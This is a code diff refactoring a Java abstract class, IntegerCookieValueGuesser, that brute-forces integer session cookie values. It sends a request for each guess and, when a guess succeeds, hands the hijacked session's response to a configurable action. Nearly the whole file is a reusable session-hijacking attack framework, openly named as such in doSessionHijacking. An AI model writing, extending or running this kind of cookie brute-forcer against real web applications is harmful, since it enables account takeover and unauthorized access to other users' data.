@@ -4,37 +4,33 @@ import responseReader.HttpURLConnectionResponseReader;
 
 import java.net.HttpURLConnection;
 import java.util.function.Consumer;
+import java.util.function.Function;
 
 public abstract class IntegerCookieValueGuesser {
 
     private final int guessFrom;
     private final int guessTo;
+    private final Function<Integer, String> integerTransformer;
     private final HttpURLConnectionResponseReader responseReader;
+    private final Consumer<String> hijackingAction;
 
-    public IntegerCookieValueGuesser(int guessFrom, int guessTo,
-                                     HttpURLConnectionResponseReader responseReader) {
+    public IntegerCookieValueGuesser(int guessFrom, int guessTo) {
         this.guessFrom = guessFrom;
         this.guessTo = guessTo;
-        this.responseReader = responseReader;
+        this.integerTransformer = getIntegerTransformer();
+        this.responseReader = getResponseReader();
+        this.hijackingAction = getHijackingAction();
     }
 
-    public void doSessionHijacking(Consumer<String> hijackingAction) throws Throwable{
-        int cookieValue = guessCookieValue();
-        String cookie = String.format(getCookieTemplate(), cookieValue);
-        HttpURLConnection httpURLConnection = getHttpURLConnection(cookie);
-        String response = responseReader.read(httpURLConnection);
-        httpURLConnection.disconnect();
-        hijackingAction.accept(response);
-    }
-
-    private int guessCookieValue() throws Throwable{
+    public void doSessionHijacking() throws Throwable{
         String cookieTemplate = getCookieTemplate();
         for(int i = guessFrom; i <= guessTo; i++){
-            String cookie = String.format(cookieTemplate, i);
+            String cookie = String.format(cookieTemplate, integerTransformer.apply(i));
             HttpURLConnection httpURLConnection = getHttpURLConnection(cookie);
             String response = responseReader.read(httpURLConnection);
             if(isGuessSuccessful(response)){
-                return i;
+                hijackingAction.accept(response);
+                return;
             }
             httpURLConnection.disconnect();
         }
@@ -47,4 +43,9 @@ public abstract class IntegerCookieValueGuesser {
 
     protected abstract HttpURLConnection getHttpURLConnection(String cookie) throws Exception;
 
+    protected abstract HttpURLConnectionResponseReader getResponseReader();
+
+    protected abstract Function<Integer, String> getIntegerTransformer();
+
+    protected abstract Consumer<String> getHijackingAction();
 }
